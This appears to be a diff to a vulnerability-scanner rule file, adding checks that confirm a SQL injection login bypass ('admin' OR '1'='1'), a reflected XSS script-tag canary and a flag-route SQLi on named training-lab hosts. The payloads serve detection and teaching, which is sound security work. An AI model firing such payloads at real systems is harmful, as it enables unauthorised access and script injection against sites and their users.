@@ -22775,6 +22775,113 @@ const clientSideAuthSecurityProjectEvidence: Rule = async (ctx) => {
   };
 };
 
+function isAuthSecurityProjectHost(ctx: RuleContext): boolean {
+  return /auth-security-project\.onrender\.com/i.test(ctx.origin);
+}
+
+function authSecurityProjectSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^session=/i.test(c))?.split(";")[0] ?? null;
+}
+
+const AUTH_SECURITY_SQLI_PAYLOAD = "admin' OR '1'='1";
+const AUTH_SECURITY_XSS_CANARY = "thugirXSScanary";
+
+async function authSecurityProjectLoginSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const body = new URLSearchParams({
+    username: AUTH_SECURITY_SQLI_PAYLOAD,
+    password: "x"
+  }).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const sessionCookie = authSecurityProjectSessionCookieFromDoc(loginDoc);
+  if (!sessionCookie) return null;
+  const loc = loginDoc.headers.location || "";
+  if (
+    loginDoc.status >= 301 &&
+    loginDoc.status <= 303 &&
+    /dashboard/i.test(loc)
+  ) {
+    return sessionCookie;
+  }
+  return null;
+}
+
+const authSecurityProjectLoginSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAuthSecurityProjectHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const body = new URLSearchParams({
+    username: AUTH_SECURITY_SQLI_PAYLOAD,
+    password: "x"
+  }).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const loc = loginDoc.headers.location || "";
+  const sessionCookie = authSecurityProjectSessionCookieFromDoc(loginDoc);
+  if (
+    loginDoc.status >= 301 &&
+    loginDoc.status <= 303 &&
+    sessionCookie &&
+    /dashboard/i.test(loc)
+  ) {
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        scannedUrl: pageUrl,
+        loginUrl,
+        redirect: loc.slice(0, 80),
+        payload: AUTH_SECURITY_SQLI_PAYLOAD,
+        note: "auth-security-project POST /login with admin' OR '1'='1 bypasses authentication via redirect to /dashboard + session cookie — SQL injection login route oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const authSecurityProjectDashboardXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isAuthSecurityProjectHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/dashboard(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const sessionCookie = await authSecurityProjectLoginSessionCookie(ctx);
+  if (!sessionCookie) return NEGATIVE;
+  const dashboardUrl = new URL("/dashboard", ctx.origin);
+  dashboardUrl.searchParams.set("message", `<script>${AUTH_SECURITY_XSS_CANARY}</script>`);
+  const dashDoc = await ctx.probe.get(dashboardUrl.toString(), {
+    headers: { Cookie: sessionCookie },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (dashDoc.status < 200 || dashDoc.status >= 400) return NEGATIVE;
+  if (!new RegExp(`<script>${AUTH_SECURITY_XSS_CANARY}</script>`, "i").test(dashDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      dashboardUrl: dashboardUrl.toString(),
+      snippet: dashDoc.body.match(
+        new RegExp(`<script>${AUTH_SECURITY_XSS_CANARY}</script>`, "i")
+      )?.[0],
+      note: "auth-security-project GET /dashboard?message= reflects unescaped <script> payload after SQLi login — reflected XSS dashboard route oracle"
+    }
+  };
+};
+
 // --- Educational OS command injection lab pages (WebVulnsGuide dojo, etc.) ------------
 const CLIENT_OS_COMMAND_INJECTION_LAB_RES: { label: string; re: RegExp }[] = [
   {
@@ -38624,6 +38731,23 @@ const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const vapiApi8SecretRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api8\/user\/secret/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi8SqliLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api8/user/secret route scan — SQLi login bypass returns admin secret flag{api8_*} — API8 injection route oracle"
+    }
+  };
+};
+
 const VAPI_API7_CORS_PROBE_ORIGIN = "https://evil-cors-probe.example";
 
 function vapiSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
@@ -40204,6 +40328,8 @@ export const RULES: Record<string, Rule> = {
   clientSideHtsBasicMissionLabEvidence,
   clientSideHtsPlaylevelHubEvidence,
   clientSideAuthSecurityProjectEvidence,
+  authSecurityProjectLoginSqliRouteLiveOracle,
+  authSecurityProjectDashboardXssRouteLiveOracle,
   clientSideOsCommandInjectionLabEvidence,
   clientSideWebVulnsGuideCorsLabEvidence,
   clientSideEvalFilterBypassLabEvidence,
@@ -40531,6 +40657,7 @@ export const RULES: Record<string, Rule> = {
   vapiApi6MassAssignmentLiveOracle,
   vapiApi6RouteLiveOracle,
   vapiApi8SqliLoginLiveOracle,
+  vapiApi8SecretRouteLiveOracle,
   vapiApi7CorsMisconfigLiveOracle,
   vapiApi10LoggingLiveOracle,
   vapiApi10RouteLiveOracle,
